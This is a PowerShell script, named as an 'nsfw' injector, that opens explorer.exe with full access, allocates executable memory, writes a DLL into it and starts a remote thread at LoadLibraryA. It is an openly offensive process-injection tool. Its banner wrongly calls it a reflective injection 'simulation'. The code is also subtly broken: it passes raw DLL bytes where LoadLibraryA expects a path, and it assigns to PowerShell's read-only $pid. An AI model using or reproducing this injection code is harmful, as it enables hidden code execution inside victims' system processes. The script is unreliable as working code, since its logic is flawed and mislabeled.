# nsfw_injector.ps1
param (
    [string]$dllPath = "$PSScriptRoot\nsfw.dll",
    [string]$targetProcess = "explorer.exe"
)

Write-Host "[*] Starting Reflective DLL Injection Simulation..." -ForegroundColor Red

# Get target process
$proc = Get-Process | Where-Object { $_.Name -eq ($targetProcess -replace ".exe","") } | Select-Object -First 1
if (-not $proc) {
    Write-Host "[!] Target process not found: $targetProcess" -ForegroundColor Yellow
    exit 1
}
$pid = $proc.Id
Write-Host "[+] Found process $targetProcess with PID $pid"

# Read DLL bytes
if (-not (Test-Path $dllPath)) {
    Write-Host "[!] DLL not found at path: $dllPath" -ForegroundColor Yellow
    exit 1
}
$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
$dllLength = $dllBytes.Length

# Define Win32 API calls
$kernel32 = Add-Type -MemberDefinition @"
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string lpModuleName);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern bool CloseHandle(IntPtr hObject);
"@ -Name "Win32" -Namespace "Kernel" -PassThru

# Constants
$PROCESS_ALL_ACCESS = 0x001F0FFF
$MEM_COMMIT = 0x00001000
$PAGE_EXECUTE_READWRITE = 0x40

# Open target process
$hProcess = [Kernel.Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to open process" -ForegroundColor Red
    exit 1
}

# Allocate memory
$alloc = [Kernel.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllLength, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
if ($alloc -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
    [Kernel.Win32]::CloseHandle($hProcess)
    exit 1
}

# Write DLL to memory
$out = 0
$wpm = [Kernel.Win32]::WriteProcessMemory($hProcess, $alloc, $dllBytes, $dllLength, [ref]$out)
if (-not $wpm) {
    Write-Host "[!] Failed to write DLL to process memory" -ForegroundColor Red
    [Kernel.Win32]::CloseHandle($hProcess)
    exit 1
}

Write-Host "[+] DLL written to memory at address: $($alloc.ToInt64())"

# LoadLibraryA address
$hKernel32 = [Kernel.Win32]::GetModuleHandle("kernel32.dll")
$loadLibAddr = [Kernel.Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
if ($loadLibAddr -eq [IntPtr]::Zero) {
    Write-Host "[!] Failed to find LoadLibraryA" -ForegroundColor Red
    [Kernel.Win32]::CloseHandle($hProcess)
    exit 1
}

# Start remote thread
$hThread = [Kernel.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $alloc, 0, [IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) {
    Write-Host "[!] Remote thread creation failed" -ForegroundColor Red
    [Kernel.Win32]::CloseHandle($hProcess)
    exit 1
}

Write-Host "[] DLL injected via remote thread!" -ForegroundColor Green
[Kernel.Win32]::CloseHandle($hProcess)


